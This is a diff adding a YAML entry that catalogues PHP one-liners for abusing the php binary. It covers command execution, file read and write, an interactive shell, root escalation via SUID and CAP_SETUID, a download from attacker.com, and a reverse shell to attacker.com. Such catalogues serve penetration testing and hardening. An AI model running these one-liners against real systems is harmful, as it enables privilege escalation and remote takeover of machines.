@@ -1,0 +1,121 @@
+---
+functions:
+  command:
+  - code: |-
+      php -r 'echo shell_exec("/path/to/command");'
+    contexts:
+      sudo:
+      suid:
+        shell: true
+      unprivileged:
+  - code: |-
+      php -r '$r=array(); exec("/path/to/command", $r); print(join("\n",$r));'
+    contexts:
+      sudo:
+      suid:
+        shell: true
+      unprivileged:
+  - code: |-
+      php -r '$p = array(array("pipe","r"),array("pipe","w"),array("pipe", "w"));$h = @proc_open("/path/to/command", $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'
+    contexts:
+      sudo:
+      suid:
+        shell: true
+      unprivileged:
+  download:
+  - code: |-
+      php -r '$c=file_get_contents("http://attacker.com/path/to/input-file"); file_put_contents("/path/to/output-file", $c);'
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+    sender: http-server
+  file-read:
+  - code: |-
+      php -r 'readfile("/path/to/input-file");'
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+  file-write:
+  - code: |-
+      php -r 'file_put_contents("/path/to/output-file", "DATA");'
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+  reverse-shell:
+  - code: |-
+      php -r '$sock=fsockopen("attacker.com",12345);exec("/bin/sh -i 0<&3 1>&3 2>&3");'
+    contexts:
+      sudo:
+      suid:
+        shell: true
+      unprivileged:
+    listener: tcp-server
+  shell:
+  - code: |-
+      php -r 'system("/bin/sh -i");'
+    contexts:
+      capabilities:
+        code: |-
+          php -r 'posix_setuid(0); system("/bin/sh -i");'
+        list:
+        - CAP_SETUID
+      sudo:
+      suid:
+        shell: true
+      unprivileged:
+    tty: false
+  - code: |-
+      php -r 'passthru("/bin/sh -i");'
+    contexts:
+      capabilities:
+        code: |-
+          php -r 'posix_setuid(0); passthru("/bin/sh -i");'
+        list:
+        - CAP_SETUID
+      sudo:
+      suid:
+        shell: true
+      unprivileged:
+    tty: false
+  - code: |-
+      php -r '$h=@popen("/bin/sh -i","r"); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'
+    contexts:
+      capabilities:
+        code: |-
+          php -r 'posix_setuid(0); $h=@popen("/bin/sh -i","r"); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'
+        list:
+        - CAP_SETUID
+      sudo:
+      suid:
+        shell: true
+      unprivileged:
+    tty: false
+  - code: |-
+      php -r "pcntl_exec('/bin/sh');"
+    contexts:
+      capabilities:
+        code: |-
+          php -r 'posix_setuid(0); system("/bin/sh -i");'
+        list:
+        - CAP_SETUID
+      sudo:
+      suid:
+        code: |-
+          php -r "pcntl_exec('/bin/sh', ['-p']);"
+        shell: false
+      unprivileged:
+    tty: false
+  upload:
+  - code: |-
+      php -S 0.0.0.0:80
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+    receiver: http-client
+    version: |-
+      >= 5.4
+...
